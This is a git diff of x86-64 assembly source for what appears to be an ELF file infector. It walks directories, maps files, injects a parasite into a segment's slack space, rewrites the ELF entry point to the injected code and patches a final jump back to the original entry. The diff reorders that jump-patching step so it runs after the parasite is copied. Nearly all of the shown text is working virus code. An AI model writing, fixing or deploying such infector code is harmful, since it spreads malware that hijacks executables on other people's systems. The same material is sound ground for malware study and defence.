@@ -25,8 +25,7 @@ _start:
     mov rsi, dir2Len
     call _readDir
 	_final_jmp:
-	jmp 0xffffffff
-    ; jmp _exit
+    jmp _exit
 
 ; take directory to open in rdi && size of pwd on rsi
 _readDir:
@@ -122,7 +121,7 @@ _check_file:
 		jle _close_file
 
 	_map_file:
-	; *rax -> map
+	; rax	-> map
 		mov rsi, rax								; rsi = file_size
 		mov rax, SYS_MMAP
 		mov	rdi, 0x0
@@ -204,6 +203,7 @@ _infection:
 	; r11	== injection offset
 	;*r12	-> ehdr.e_entry
 	;*r15	-> segment end
+	; ehdr->e_entry = (Elf64_Addr)(cave_segment->p_vaddr + cave_segment->p_memsz);
 		mov r11, r15							; r11 -> end of curr_segment
 		sub r11, rax 							; r11 = injection offset
 		mov [r12], r11							; ehdr.e_entry = injection offset
@@ -216,22 +216,6 @@ _infection:
 	add	qword [r12], qword CODE_LEN
 	add r14, elf64_phdr.p_memsz
 	add qword [r14], qword CODE_LEN
-	; === update jmp end parasite ===
-	_update_parasite_jmp:
-	; r11	-> parasite final jmp instruction
-	; r12	== distance to jump from parasite last jmp to original entry
-	;*r13	== original entry offset
-	; r14	== tmp addr container
-	; int32_t	jmp_offset = original_entry - (0x1175 + index_jmp + 5); 
-		lea r12, [rel _final_jmp]				; r12 -> _final_jmp
-		lea r14, [rel _start]					; r14 -> parasite _start
-		sub r12, r14							; r12 == offset between parasite _start and _final_jmp
-		add r12, r13 							; r12 == _final_jmp's offset in final binary
-		mov r11, rax
-		add r11, r12							; 
-		add r11, 0x1							; r11 -> just after the jmp instruction
-		mov [r11], qword r13					; write the offset to jump to
-
 	; === copy parasite ===
 	_copy_parasite:
 	;*r15	-> segment_end
@@ -241,6 +225,23 @@ _infection:
 		mov rcx, CODE_LEN						; counter will decrement
 		cld										; copy from _start to _end (= !std)
 		rep movsb
+	; === update jmp end parasite ===
+	_update_parasite_jmp:
+	; r10	-> parasite final jmp instruction
+	;*r11	== injection offset
+	; r12	== distance to jump from parasite last jmp to original entry
+	;*r13	== original entry offset
+	; r14	-> parsite's _start
+	; int32_t	jmp_offset = original_entry - (0x1175 + index_jmp + 5); 
+		lea r12, [rel _final_jmp]				; r12 -> _final_jmp
+		lea r14, [rel _start]					; r14 -> parasite _start
+		sub r12, r14							; r12 == _final_jmp's offset
+		add r12, r11 							; r12 == _final_jmp's offset in final binary
+		mov r10, rax
+		add r10, r12							; 
+		add r10, 0x1							; r11 -> just after the jmp instruction
+		mov [r10], qword r13					; write the offset to jump to
+
 
 	jmp _leave_return
 
